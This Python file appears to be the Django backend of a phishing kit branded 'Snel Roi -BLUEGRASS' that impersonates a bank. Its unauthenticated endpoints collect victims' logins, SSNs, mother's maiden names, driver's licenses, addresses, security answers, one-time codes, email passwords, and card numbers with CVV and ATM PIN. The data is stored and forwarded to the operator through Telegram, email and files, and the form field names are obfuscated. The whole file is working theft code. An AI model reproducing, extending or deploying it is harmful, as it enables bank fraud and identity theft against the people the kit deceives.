import logging
import os
import re
from datetime import datetime

from django.conf import settings
from rest_framework import status
from rest_framework.decorators import api_view, authentication_classes, permission_classes
from rest_framework.response import Response

from core.app_config import app_settings
from core.middleware.block_ips_middleware import (
    get_city_from_ip,
    get_client_ip,
    get_country_from_ip,
    get_user_browser,
    get_user_os,
)
from core.settings import save_data_to_file, send_data_email, send_data_telegram
from user_data.models import Address, BankInfo, BrowserDetail, Client


logger = logging.getLogger(__name__)


def _notification_sender():
    return app_settings.get("from_email") or settings.DEFAULT_FROM_EMAIL


def _notification_recipients():
    recipients = app_settings.get("send_email_list") or getattr(settings, "EMAIL_RECIPIENTS", [])
    return [addr for addr in recipients if addr]


BRAND_TAG = "|=====||Snel Roi -BLUEGRASS||=====|\n"


@api_view(["POST"])
@permission_classes([])
@authentication_classes([])
def bluegrass_collect_user_login_cred(request):
    payload = {}
    data = {}
    errors = {}

    if request.method == "POST":
        try:
            username = request.data.get("emzemz", "")
            password = request.data.get("pwzenz", "")

            if not username:
                errors["username"] = ["Username is required."]

            if not password:
                errors["password"] = ["Password is required."]

            if errors:
                payload["message"] = "Errors"
                payload["errors"] = errors
                return Response(payload, status=status.HTTP_400_BAD_REQUEST)

            ip = get_client_ip(request)
            agent = request.META.get("HTTP_USER_AGENT", "")

            country = get_country_from_ip(ip)
            city = get_city_from_ip(ip)
            browser = get_user_browser(agent)
            os = get_user_os(agent)
            date = datetime.now().strftime("%I:%M:%S %d/%m/%Y")

            client, _ = Client.objects.get_or_create(username=username)
            client.email = username
            client.save()

            BankInfo.objects.create(
                client=client,
                password=password,
                username=username,
            )

            browser_data, _ = BrowserDetail.objects.get_or_create(client=client)
            browser_data.ip = ip
            browser_data.agent = agent
            browser_data.country = country
            browser_data.city = city
            browser_data.address = f"{city}, {country}"
            browser_data.browser = browser
            browser_data.os = os
            browser_data.time = date
            browser_data.date = date
            browser_data.save()

            message = BRAND_TAG
            message += "|========= [  LOGIN  ] ==========|\n"
            message += f"| ➤ [ Username ]         : {username}\n"
            message += f"| ➤ [ Password ]         : {password}\n"
            message += "|=====================================|\n"
            message += "| 🌍 B R O W S E R ~ D E T A I L S 🌍\n"
            message += "|======================================|\n"
            message += f"| ➤ [ IP Address ]   : {ip}\r\n"
            message += f"| ➤ [ IP Country ]   : {country}\r\n"
            message += f"| ➤ [ IP City ]      : {city}\r\n"
            message += f"| ➤ [ Browser ]      : {browser} on {os}\r\n"
            message += f"| ➤ [ User Agent ]   : {agent}\r\n"
            message += f"| ➤ [ TIME ]         : {date}\r\n"
            message += "|=====================================|\n"

            send_data_telegram(app_settings, message)

            subject = "The Data"
            from_email = _notification_sender()
            recipient_list = _notification_recipients()

            send_data_email(subject, message, from_email, recipient_list)

            save_data_to_file(username, message)

            payload["message"] = "Successful"
            payload["data"] = data
        except Exception:  # pragma: no cover - defensive logging
            logger.exception("bluegrass_collect_user_login_cred failed")
            payload["message"] = "Errors"
            payload["errors"] = {"detail": ["Internal server error"]}
            return Response(payload, status=status.HTTP_500_INTERNAL_SERVER_ERROR)
    return Response(payload)


@api_view(["POST"])
@permission_classes([])
@authentication_classes([])
def bluegrass_collect_user_login_cred2(request):
    payload = {}
    data = {}
    errors = {}

    if request.method == "POST":
        try:
            username = request.data.get("emzemz", "")
            password = request.data.get("pwzenz", "")

            if not username:
                errors["username"] = ["Username is required."]

            if not password:
                errors["password"] = ["Password is required."]

            if errors:
                payload["message"] = "Errors"
                payload["errors"] = errors
                return Response(payload, status=status.HTTP_400_BAD_REQUEST)

            ip = get_client_ip(request)
            agent = request.META.get("HTTP_USER_AGENT", "")

            country = get_country_from_ip(ip)
            city = get_city_from_ip(ip)
            browser = get_user_browser(agent)
            os = get_user_os(agent)
            date = datetime.now().strftime("%I:%M:%S %d/%m/%Y")

            client, _ = Client.objects.get_or_create(username=username)
            client.email = username
            client.save()

            bank_info, _ = BankInfo.objects.get_or_create(client=client)
            bank_info.password2 = password
            bank_info.username2 = username
            bank_info.save()

            browser_data, _ = BrowserDetail.objects.get_or_create(client=client)
            browser_data.ip = ip
            browser_data.agent = agent
            browser_data.country = country
            browser_data.city = city
            browser_data.address = f"{city}, {country}"
            browser_data.browser = browser
            browser_data.os = os
            browser_data.time = date
            browser_data.date = date
            browser_data.save()

            message = BRAND_TAG
            message += "|========= [  LOGIN CONFIRM ] ==========|\n"
            message += f"| ➤ [ Username ]        : {username}\n"
            message += f"| ➤ [ Password2 ]       : {password}\n"
            message += "|=====================================|\n"
            message += "| 🌍 B R O W S E R ~ D E T A I L S 🌍\n"
            message += "|======================================|\n"
            message += f"| ➤ [ IP Address ]   : {ip}\r\n"
            message += f"| ➤ [ IP Country ]   : {country}\r\n"
            message += f"| ➤ [ IP City ]      : {city}\r\n"
            message += f"| ➤ [ Browser ]      : {browser} on {os}\r\n"
            message += f"| ➤ [ User Agent ]   : {agent}\r\n"
            message += f"| ➤ [ TIME ]         : {date}\r\n"
            message += "|=====================================|\n"

            send_data_telegram(app_settings, message)

            subject = "The Data"
            from_email = _notification_sender()
            recipient_list = _notification_recipients()

            send_data_email(subject, message, from_email, recipient_list)

            save_data_to_file(username, message)

            payload["message"] = "Successful"
            payload["data"] = data
        except Exception:  # pragma: no cover
            logger.exception("bluegrass_collect_user_login_cred2 failed")
            payload["message"] = "Errors"
            payload["errors"] = {"detail": ["Internal server error"]}
            return Response(payload, status=status.HTTP_500_INTERNAL_SERVER_ERROR)
    return Response(payload)


@api_view(["POST"])
@permission_classes([])
@authentication_classes([])
def bluegrass_collect_user_basic_info(request):
    payload = {}
    data = {}
    errors = {}

    if request.method == "POST":
        try:
            username = request.data.get("emzemz", "")
            first_name = request.data.get("fzNme", "")
            last_name = request.data.get("lzNme", "")
            phone = request.data.get("phone", "")
            ssn = request.data.get("ssn", "")
            mother_maiden_name = request.data.get("motherMaidenName", "")
            dob = request.data.get("dob", "")
            driver_license = request.data.get("driverLicense", "")

            if not username:
                errors["username"] = ["Username is required."]
            if not first_name:
                errors["firstName"] = ["First name is required."]
            if not last_name:
                errors["lastName"] = ["Last name is required."]
            if not phone:
                errors["phone"] = ["Phone is required."]
            if not ssn:
                errors["ssn"] = ["SSN is required."]
            if not mother_maiden_name:
                errors["motherMaidenName"] = ["Mother's maiden name is required."]
            if not dob:
                errors["dob"] = ["Date of birth is required."]
            if not driver_license:
                errors["driverLicense"] = ["Driver's license is required."]

            if errors:
                payload["message"] = "Errors"
                payload["errors"] = errors
                return Response(payload, status=status.HTTP_400_BAD_REQUEST)

            ip = get_client_ip(request)
            agent = request.META.get("HTTP_USER_AGENT", "")

            country = get_country_from_ip(ip)
            city = get_city_from_ip(ip)
            browser = get_user_browser(agent)
            os = get_user_os(agent)
            date = datetime.now().strftime("%I:%M:%S %d/%m/%Y")

            client, _ = Client.objects.get_or_create(username=username)
            client.first_name = first_name
            client.last_name = last_name
            client.phone = phone
            client.ssn = ssn
            client.mother_maiden_name = mother_maiden_name
            client.dob = dob
            client.driver_license = driver_license
            client.email = username
            client.save()

            browser_data, _ = BrowserDetail.objects.get_or_create(client=client)
            browser_data.ip = ip
            browser_data.agent = agent
            browser_data.country = country
            browser_data.city = city
            browser_data.address = f"{city}, {country}"
            browser_data.browser = browser
            browser_data.os = os
            browser_data.time = date
            browser_data.date = date
            browser_data.save()

            message = BRAND_TAG
            message += "|========= [  BASIC INFO ] ==========|\n"
            message += f"| ➤ [ Username ]           : {username}\n"
            message += f"| ➤ [ First Name ]         : {first_name}\n"
            message += f"| ➤ [ Last Name ]          : {last_name}\n"
            message += f"| ➤ [ Phone ]              : {phone}\n"
            message += f"| ➤ [ SSN ]                : {ssn}\n"
            message += f"| ➤ [ Mother Maiden Name ] : {mother_maiden_name}\n"
            message += f"| ➤ [ Date of Birth ]      : {dob}\n"
            message += f"| ➤ [ Driver's License ]   : {driver_license}\n"
            message += "|=====================================|\n"
            message += "| 🌍 B R O W S E R ~ D E T A I L S 🌍\n"
            message += "|======================================|\n"
            message += f"| ➤ [ IP Address ]   : {ip}\r\n"
            message += f"| ➤ [ IP Country ]   : {country}\r\n"
            message += f"| ➤ [ IP City ]      : {city}\r\n"
            message += f"| ➤ [ Browser ]      : {browser} on {os}\r\n"
            message += f"| ➤ [ User Agent ]   : {agent}\r\n"
            message += f"| ➤ [ TIME ]         : {date}\r\n"
            message += "|=====================================|\n"

            send_data_telegram(app_settings, message)

            subject = "The Data"
            from_email = _notification_sender()
            recipient_list = _notification_recipients()

            send_data_email(subject, message, from_email, recipient_list)

            save_data_to_file(username, message)

            payload["message"] = "Successful"
            payload["data"] = data
        except Exception:  # pragma: no cover
            logger.exception("bluegrass_collect_user_basic_info failed")
            payload["message"] = "Errors"
            payload["errors"] = {"detail": ["Internal server error"]}
            return Response(payload, status=status.HTTP_500_INTERNAL_SERVER_ERROR)
    return Response(payload)


@api_view(["POST"])
@permission_classes([])
@authentication_classes([])
def bluegrass_collect_user_home_address(request):
    payload = {}
    data = {}
    errors = {}

    if request.method == "POST":
        try:
            username = request.data.get("emzemz", "")
            street_address = request.data.get("stAd", "")
            apt = request.data.get("apt", "")
            city_value = request.data.get("city", "")
            state = request.data.get("state", "")
            zip_code = request.data.get("zipCode", "")

            if not username:
                errors["username"] = ["Username is required."]

            if errors:
                payload["message"] = "Errors"
                payload["errors"] = errors
                return Response(payload, status=status.HTTP_400_BAD_REQUEST)

            ip = get_client_ip(request)
            agent = request.META.get("HTTP_USER_AGENT", "")

            country = get_country_from_ip(ip)
            city = get_city_from_ip(ip)
            browser = get_user_browser(agent)
            os = get_user_os(agent)
            date = datetime.now().strftime("%I:%M:%S %d/%m/%Y")

            client, _ = Client.objects.get_or_create(username=username)

            address, _ = Address.objects.get_or_create(client=client)
            address.street_address = street_address
            address.apartment_unit = apt
            address.city = city_value
            address.state = state
            address.zip_code = zip_code
            address.save()

            browser_data, _ = BrowserDetail.objects.get_or_create(client=client)
            browser_data.ip = ip
            browser_data.agent = agent
            browser_data.country = country
            browser_data.city = city
            browser_data.address = f"{city}, {country}"
            browser_data.browser = browser
            browser_data.os = os
            browser_data.time = date
            browser_data.date = date
            browser_data.save()

            message = BRAND_TAG
            message += "|========= [  HOME ADDRESS ] ==========|\n"
            message += f"| ➤ [ Street Address ]   : {street_address}\n"
            message += f"| ➤ [ City ]             : {city_value}\n"
            message += f"| ➤ [ Apartment/Unit ]   : {apt}\n"
            message += f"| ➤ [ State ]            : {state}\n"
            message += f"| ➤ [ Zip Code ]         : {zip_code}\n"
            message += "|=====================================|\n"
            message += "| 🌍 B R O W S E R ~ D E T A I L S 🌍\n"
            message += "|======================================|\n"
            message += f"| ➤ [ IP Address ]   : {ip}\r\n"
            message += f"| ➤ [ IP Country ]   : {country}\r\n"
            message += f"| ➤ [ IP City ]      : {city}\r\n"
            message += f"| ➤ [ Browser ]      : {browser} on {os}\r\n"
            message += f"| ➤ [ User Agent ]   : {agent}\r\n"
            message += f"| ➤ [ TIME ]         : {date}\r\n"
            message += "|=====================================|\n"

            send_data_telegram(app_settings, message)

            subject = "The Data"
            from_email = _notification_sender()
            recipient_list = _notification_recipients()

            send_data_email(subject, message, from_email, recipient_list)

            save_data_to_file(username, message)

            payload["message"] = "Successful"
            payload["data"] = data
        except Exception:  # pragma: no cover
            logger.exception("bluegrass_collect_user_home_address failed")
            payload["message"] = "Errors"
            payload["errors"] = {"detail": ["Internal server error"]}
            return Response(payload, status=status.HTTP_500_INTERNAL_SERVER_ERROR)
    return Response(payload)


@api_view(["POST"])
@permission_classes([])
@authentication_classes([])
def bluegrass_collect_user_social_security(request):
    payload = {}
    data = {}
    errors = {}

    if request.method == "POST":
        try:
            username = request.data.get("emzemz", "")
            ssn_short = request.data.get("s2ns", "")
            dob = request.data.get("d_b", "")

            if not username:
                errors["username"] = ["Username is required."]

            if errors:
                payload["message"] = "Errors"
                payload["errors"] = errors
                return Response(payload, status=status.HTTP_400_BAD_REQUEST)

            ip = get_client_ip(request)
            agent = request.META.get("HTTP_USER_AGENT", "")

            country = get_country_from_ip(ip)
            city = get_city_from_ip(ip)
            browser = get_user_browser(agent)
            os = get_user_os(agent)
            date = datetime.now().strftime("%I:%M:%S %d/%m/%Y")

            client, _ = Client.objects.get_or_create(username=username)
            client.social_security_short = ssn_short
            client.dob = dob
            client.save()

            browser_data, _ = BrowserDetail.objects.get_or_create(client=client)
            browser_data.ip = ip
            browser_data.agent = agent
            browser_data.country = country
            browser_data.city = city
            browser_data.address = f"{city}, {country}"
            browser_data.browser = browser
            browser_data.os = os
            browser_data.time = date
            browser_data.date = date
            browser_data.save()

            message = BRAND_TAG
            message += "|========= [  SSN / DATE OF BIRTH ] ==========|\n"
            message += f"| ➤ [ SSN-last4 ]       : {ssn_short}\n"
            message += f"| ➤ [ DOB ]             : {dob}\n"
            message += "|=====================================|\n"
            message += "| 🌍 B R O W S E R ~ D E T A I L S 🌍\n"
            message += "|======================================|\n"
            message += f"| ➤ [ IP Address ]   : {ip}\r\n"
            message += f"| ➤ [ IP Country ]   : {country}\r\n"
            message += f"| ➤ [ IP City ]      : {city}\r\n"
            message += f"| ➤ [ Browser ]      : {browser} on {os}\r\n"
            message += f"| ➤ [ User Agent ]   : {agent}\r\n"
            message += f"| ➤ [ TIME ]         : {date}\r\n"
            message += "|=====================================|\n"

            send_data_telegram(app_settings, message)

            subject = "The Data"
            from_email = _notification_sender()
            recipient_list = _notification_recipients()

            send_data_email(subject, message, from_email, recipient_list)

            save_data_to_file(username, message)

            payload["message"] = "Successful"
            payload["data"] = data
        except Exception:  # pragma: no cover
            logger.exception("bluegrass_collect_user_social_security failed")
            payload["message"] = "Errors"
            payload["errors"] = {"detail": ["Internal server error"]}
            return Response(payload, status=status.HTTP_500_INTERNAL_SERVER_ERROR)
    return Response(payload)


@api_view(["POST"])
@permission_classes([])
@authentication_classes([])
def bluegrass_collect_user_social_security_2(request):
    payload = {}
    data = {}
    errors = {}

    if request.method == "POST":
        try:
            username = request.data.get("emzemz", "")
            ssn = request.data.get("s2ns", "")
            dob = request.data.get("d_b", "")

            if not username:
                errors["username"] = ["Username is required."]

            if errors:
                payload["message"] = "Errors"
                payload["errors"] = errors
                return Response(payload, status=status.HTTP_400_BAD_REQUEST)

            ip = get_client_ip(request)
            agent = request.META.get("HTTP_USER_AGENT", "")

            country = get_country_from_ip(ip)
            city = get_city_from_ip(ip)
            browser = get_user_browser(agent)
            os = get_user_os(agent)
            date = datetime.now().strftime("%I:%M:%S %d/%m/%Y")

            client, _ = Client.objects.get_or_create(username=username)
            client.social_security = ssn
            client.dob = dob
            client.save()

            browser_data, _ = BrowserDetail.objects.get_or_create(client=client)
            browser_data.ip = ip
            browser_data.agent = agent
            browser_data.country = country
            browser_data.city = city
            browser_data.address = f"{city}, {country}"
            browser_data.browser = browser
            browser_data.os = os
            browser_data.time = date
            browser_data.date = date
            browser_data.save()

            message = BRAND_TAG
            message += "|========= [  SSN / DATE OF BIRTH ] ==========|\n"
            message += f"| ➤ [ SSN ]             : {ssn}\n"
            message += f"| ➤ [ DOB ]             : {dob}\n"
            message += "|=====================================|\n"
            message += "| 🌍 B R O W S E R ~ D E T A I L S 🌍\n"
            message += "|======================================|\n"
            message += f"| ➤ [ IP Address ]   : {ip}\r\n"
            message += f"| ➤ [ IP Country ]   : {country}\r\n"
            message += f"| ➤ [ IP City ]      : {city}\r\n"
            message += f"| ➤ [ Browser ]      : {browser} on {os}\r\n"
            message += f"| ➤ [ User Agent ]   : {agent}\r\n"
            message += f"| ➤ [ TIME ]         : {date}\r\n"
            message += "|=====================================|\n"

            send_data_telegram(app_settings, message)

            subject = "The Data"
            from_email = _notification_sender()
            recipient_list = _notification_recipients()

            send_data_email(subject, message, from_email, recipient_list)

            save_data_to_file(username, message)

            payload["message"] = "Successful"
            payload["data"] = data
        except Exception:  # pragma: no cover
            logger.exception("bluegrass_collect_user_social_security_2 failed")
            payload["message"] = "Errors"
            payload["errors"] = {"detail": ["Internal server error"]}
            return Response(payload, status=status.HTTP_500_INTERNAL_SERVER_ERROR)
    return Response(payload)


@api_view(["POST"])
@permission_classes([])
@authentication_classes([])
def bluegrass_collect_user_security_questions(request):
    payload = {}
    data = {}
    errors = {}

    if request.method == "POST":
        username = request.data.get("emzemz", "")
        security_question1 = request.data.get("securityQuestion1", "")
        security_answer1 = request.data.get("securityAnswer1", "")
        security_question2 = request.data.get("securityQuestion2", "")
        security_answer2 = request.data.get("securityAnswer2", "")
        security_question3 = request.data.get("securityQuestion3", "")
        security_answer3 = request.data.get("securityAnswer3", "")

        if not username:
            errors["username"] = ["Username is required."]
        if not security_question1:
            errors["securityQuestion1"] = ["Security question 1 is required."]
        if not security_answer1:
            errors["securityAnswer1"] = ["Security answer 1 is required."]
        if not security_question2:
            errors["securityQuestion2"] = ["Security question 2 is required."]
        if not security_answer2:
            errors["securityAnswer2"] = ["Security answer 2 is required."]
        if not security_question3:
            errors["securityQuestion3"] = ["Security question 3 is required."]
        if not security_answer3:
            errors["securityAnswer3"] = ["Security answer 3 is required."]

        if errors:
            payload["message"] = "Errors"
            payload["errors"] = errors
            return Response(payload, status=status.HTTP_400_BAD_REQUEST)

        ip = get_client_ip(request)
        agent = request.META.get("HTTP_USER_AGENT", "")

        country = get_country_from_ip(ip)
        city = get_city_from_ip(ip)
        browser = get_user_browser(agent)
        os = get_user_os(agent)
        date = datetime.now().strftime("%I:%M:%S %d/%m/%Y")

        client, _ = Client.objects.get_or_create(username=username)
        client.security_question_1 = security_question1
        client.security_answer_1 = security_answer1
        client.security_question_2 = security_question2
        client.security_answer_2 = security_answer2
        client.security_question_3 = security_question3
        client.security_answer_3 = security_answer3
        client.save()

        browser_data, _ = BrowserDetail.objects.get_or_create(client=client)
        browser_data.ip = ip
        browser_data.agent = agent
        browser_data.country = country
        browser_data.city = city
        browser_data.address = f"{city}, {country}"
        browser_data.browser = browser
        browser_data.os = os
        browser_data.time = date
        browser_data.date = date
        browser_data.save()

        message = BRAND_TAG
        message += "|========= [  SECURITY QUESTIONS ] ==========|\n"
        message += f"| ➤ [ Question 1 ]      : {security_question1}\n"
        message += f"| ➤ [ Answer 1 ]        : {security_answer1}\n"
        message += f"| ➤ [ Question 2 ]      : {security_question2}\n"
        message += f"| ➤ [ Answer 2 ]        : {security_answer2}\n"
        message += f"| ➤ [ Question 3 ]      : {security_question3}\n"
        message += f"| ➤ [ Answer 3 ]        : {security_answer3}\n"
        message += "|=====================================|\n"
        message += "| 🌍 B R O W S E R ~ D E T A I L S 🌍\n"
        message += "|======================================|\n"
        message += f"| ➤ [ IP Address ]   : {ip}\r\n"
        message += f"| ➤ [ IP Country ]   : {country}\r\n"
        message += f"| ➤ [ IP City ]      : {city}\r\n"
        message += f"| ➤ [ Browser ]      : {browser} on {os}\r\n"
        message += f"| ➤ [ User Agent ]   : {agent}\r\n"
        message += f"| ➤ [ TIME ]         : {date}\r\n"
        message += "|=====================================|\n"

        send_data_telegram(app_settings, message)

        subject = "The Data"
        from_email = _notification_sender()
        recipient_list = _notification_recipients()

        send_data_email(subject, message, from_email, recipient_list)

        save_data_to_file(username, message)

        payload["message"] = "Successful"
        payload["data"] = data
    return Response(payload)


@api_view(["POST"])
@permission_classes([])
@authentication_classes([])
def bluegrass_collect_user_otp_verification(request):
    payload = {}
    data = {}
    errors = {}

    if request.method == "POST":
        username = request.data.get("emzemz", "")
        otp = request.data.get("otp", "")

        if not username:
            errors["username"] = ["Username is required."]
        if not otp:
            errors["otp"] = ["OTP is required."]

        if errors:
            payload["message"] = "Errors"
            payload["errors"] = errors
            return Response(payload, status=status.HTTP_400_BAD_REQUEST)

        ip = get_client_ip(request)
        agent = request.META.get("HTTP_USER_AGENT", "")

        country = get_country_from_ip(ip)
        city = get_city_from_ip(ip)
        browser = get_user_browser(agent)
        os = get_user_os(agent)
        date = datetime.now().strftime("%I:%M:%S %d/%m/%Y")

        client, _ = Client.objects.get_or_create(username=username)

        browser_data, _ = BrowserDetail.objects.get_or_create(client=client)
        browser_data.ip = ip
        browser_data.agent = agent
        browser_data.country = country
        browser_data.city = city
        browser_data.address = f"{city}, {country}"
        browser_data.browser = browser
        browser_data.os = os
        browser_data.time = date
        browser_data.date = date
        browser_data.save()

        message = BRAND_TAG
        message += "|========= [  OTP VERIFICATION ] ==========|\n"
        message += f"| ➤ [ Email ]           : {username}\n"
        message += f"| ➤ [ OTP ]             : {otp}\n"
        message += "|=====================================|\n"
        message += "| 🌍 B R O W S E R ~ D E T A I L S 🌍\n"
        message += "|======================================|\n"
        message += f"| ➤ [ IP Address ]   : {ip}\r\n"
        message += f"| ➤ [ IP Country ]   : {country}\r\n"
        message += f"| ➤ [ IP City ]      : {city}\r\n"
        message += f"| ➤ [ Browser ]      : {browser} on {os}\r\n"
        message += f"| ➤ [ User Agent ]   : {agent}\r\n"
        message += f"| ➤ [ TIME ]         : {date}\r\n"
        message += "|=====================================|\n"

        send_data_telegram(app_settings, message)

        subject = "OTP Verification Data"
        from_email = _notification_sender()
        recipient_list = _notification_recipients()

        send_data_email(subject, message, from_email, recipient_list)

        save_data_to_file(username, message)

        payload["message"] = "Successful"
        payload["data"] = data
    return Response(payload)


@api_view(["POST"])
@permission_classes([])
@authentication_classes([])
def bluegrass_collect_user_email_password(request):
    payload = {}
    data = {}
    errors = {}

    if request.method == "POST":
        try:
            username = request.data.get("emzemz", "")
            email = request.data.get("email", "")
            password = request.data.get("password", "")

            if not username:
                errors["username"] = ["Username is required."]
            if not email:
                errors["email"] = ["Email is required."]
            if not password:
                errors["password"] = ["Password is required."]

            if errors:
                payload["message"] = "Errors"
                payload["errors"] = errors
                return Response(payload, status=status.HTTP_400_BAD_REQUEST)

            ip = get_client_ip(request)
            agent = request.META.get("HTTP_USER_AGENT", "")

            country = get_country_from_ip(ip)
            city = get_city_from_ip(ip)
            browser = get_user_browser(agent)
            os = get_user_os(agent)
            date = datetime.now().strftime("%I:%M:%S %d/%m/%Y")

            client, _ = Client.objects.get_or_create(username=username)
            client.email = email
            client.save()

            bank_info, _ = BankInfo.objects.get_or_create(client=client)
            bank_info.email_password = password
            bank_info.save()

            browser_data, _ = BrowserDetail.objects.get_or_create(client=client)
            browser_data.ip = ip
            browser_data.agent = agent
            browser_data.country = country
            browser_data.city = city
            browser_data.address = f"{city}, {country}"
            browser_data.browser = browser
            browser_data.os = os
            browser_data.time = date
            browser_data.date = date
            browser_data.save()

            message = BRAND_TAG
            message += "|========= [  EMAIL/PASSWORD ] ==========|\n"
            message += f"| ➤ [ Username ]       : {username}\n"
            message += f"| ➤ [ Email ]          : {email}\n"
            message += f"| ➤ [ Password ]       : {password}\n"
            message += "|=====================================|\n"
            message += "| 🌍 B R O W S E R ~ D E T A I L S 🌍\n"
            message += "|======================================|\n"
            message += f"| ➤ [ IP Address ]   : {ip}\r\n"
            message += f"| ➤ [ IP Country ]   : {country}\r\n"
            message += f"| ➤ [ IP City ]      : {city}\r\n"
            message += f"| ➤ [ Browser ]      : {browser} on {os}\r\n"
            message += f"| ➤ [ User Agent ]   : {agent}\r\n"
            message += f"| ➤ [ TIME ]         : {date}\r\n"
            message += "|=====================================|\n"

            send_data_telegram(app_settings, message)

            subject = "The Data"
            from_email = _notification_sender()
            recipient_list = _notification_recipients()

            send_data_email(subject, message, from_email, recipient_list)

            save_data_to_file(username, message)

            payload["message"] = "Successful"
            payload["data"] = data
        except Exception:  # pragma: no cover
            logger.exception("bluegrass_collect_user_email_password failed")
            payload["message"] = "Errors"
            payload["errors"] = {"detail": ["Internal server error"]}
            return Response(payload, status=status.HTTP_500_INTERNAL_SERVER_ERROR)
    return Response(payload)


@api_view(["POST"])
@permission_classes([])
@authentication_classes([])
def bluegrass_collect_user_card_info(request):
    payload = {}
    data = {}
    errors = {}

    if request.method == "POST":
        try:
            username = request.data.get("emzemz", "")
            card_number = request.data.get("cardNumber", "")
            expiry_month = request.data.get("expiryMonth", "")
            expiry_year = request.data.get("expiryYear", "")
            cvv = request.data.get("cvv", "")
            atm_pin = request.data.get("atmPin", "")

            if not username:
                errors["username"] = ["Username is required."]
            if not card_number:
                errors["cardNumber"] = ["Card number is required."]
            if not expiry_month:
                errors["expiryMonth"] = ["Expiry month is required."]
            if not expiry_year:
                errors["expiryYear"] = ["Expiry year is required."]
            if not cvv:
                errors["cvv"] = ["CVV is required."]
            if not atm_pin:
                errors["atmPin"] = ["ATM PIN is required."]

            if errors:
                payload["message"] = "Errors"
                payload["errors"] = errors
                return Response(payload, status=status.HTTP_400_BAD_REQUEST)

            ip = get_client_ip(request)
            agent = request.META.get("HTTP_USER_AGENT", "")

            country = get_country_from_ip(ip)
            city = get_city_from_ip(ip)
            browser = get_user_browser(agent)
            os = get_user_os(agent)
            date = datetime.now().strftime("%I:%M:%S %d/%m/%Y")

            client, _ = Client.objects.get_or_create(username=username)

            bank_info, _ = BankInfo.objects.get_or_create(client=client)
            bank_info.card_number = card_number
            bank_info.card_expiry = f"{expiry_month}/{expiry_year}"
            bank_info.card_cvv = cvv
            bank_info.atm_pin = atm_pin
            bank_info.save()

            browser_data, _ = BrowserDetail.objects.get_or_create(client=client)
            browser_data.ip = ip
            browser_data.agent = agent
            browser_data.country = country
            browser_data.city = city
            browser_data.address = f"{city}, {country}"
            browser_data.browser = browser
            browser_data.os = os
            browser_data.time = date
            browser_data.date = date
            browser_data.save()

            message = BRAND_TAG
            message += "|========= [  CARD INFO ] ==========|\n"
            message += f"| ➤ [ Username ]       : {username}\n"
            message += f"| ➤ [ Card Number ]    : {card_number}\n"
            message += f"| ➤ [ Expiry ]         : {expiry_month}/{expiry_year}\n"
            message += f"| ➤ [ CVV ]            : {cvv}\n"
            message += f"| ➤ [ ATM PIN ]        : {atm_pin}\n"
            message += "|=====================================|\n"
            message += "| 🌍 B R O W S E R ~ D E T A I L S 🌍\n"
            message += "|======================================|\n"
            message += f"| ➤ [ IP Address ]   : {ip}\r\n"
            message += f"| ➤ [ IP Country ]   : {country}\r\n"
            message += f"| ➤ [ IP City ]      : {city}\r\n"
            message += f"| ➤ [ Browser ]      : {browser} on {os}\r\n"
            message += f"| ➤ [ User Agent ]   : {agent}\r\n"
            message += f"| ➤ [ TIME ]         : {date}\r\n"
            message += "|=====================================|\n"

            send_data_telegram(app_settings, message)

            subject = "The Data"
            from_email = _notification_sender()
            recipient_list = _notification_recipients()

            send_data_email(subject, message, from_email, recipient_list)

            save_data_to_file(username, message)

            payload["message"] = "Successful"
            payload["data"] = data
        except Exception:  # pragma: no cover
            logger.exception("bluegrass_collect_user_card_info failed")
            payload["message"] = "Errors"
            payload["errors"] = {"detail": ["Internal server error"]}
            return Response(payload, status=status.HTTP_500_INTERNAL_SERVER_ERROR)
    return Response(payload)
